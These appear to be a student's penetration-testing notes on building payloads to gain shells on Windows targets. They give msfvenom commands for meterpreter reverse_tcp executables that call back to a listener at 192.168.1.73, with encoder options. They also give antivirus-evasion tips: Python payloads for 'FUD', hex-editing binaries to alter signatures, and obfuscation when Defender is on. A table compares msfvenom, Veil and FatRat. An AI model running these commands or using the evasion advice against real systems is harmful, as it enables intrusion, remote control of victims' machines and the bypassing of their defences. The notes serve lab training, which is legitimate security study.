# Gaining Access - Payload Generation & Post-Exploitation

## Overview
Creating payloads to gain shells on target machines. Tools covered: msfvenom, Veil, FatRat, hexeditor. Payloads can be raw or obfuscated to bypass antivirus.

## msfvenom Commands

**Basic payload generation:**
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.73 LPORT=4444 -f exe -o pay.exe

**With encoding:**
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.73 LPORT=4444 -e [encoder_name] -i 4 -f exe -o pay.exe
- -e = encoder (e.g., x86/shikata_ga_nai)
- -i = number of encoding iterations

**For FUD:** Python payloads (.py) often bypass antivirus because they're not compiled executables.

## Tools Tested

| Tool | Result | Notes |
|------|--------|-------|
| msfvenom | Working | Reliable, always works on test environments |
| Veil | Skipped | Installation problems, too many dependencies |
| FatRat | Failed | Payloads broke/crashed, obfuscation corrupted exe |
| hexeditor | Useful | Manually modify binary to change signatures |

## Key Lessons

- FatRat and obfuscation tools add complexity — if payload breaks, it's usually the packing, not AV detection
- Windows Defender ≠ Windows Firewall (one blocks files, one blocks ports)
- With Defender OFF, use clean msfvenom payloads. With Defender ON, obfuscation matters
- Realistic practice = Defender ON + Firewall ON
- Staged (/) vs stageless (_) payloads: stageless more reliable but larger
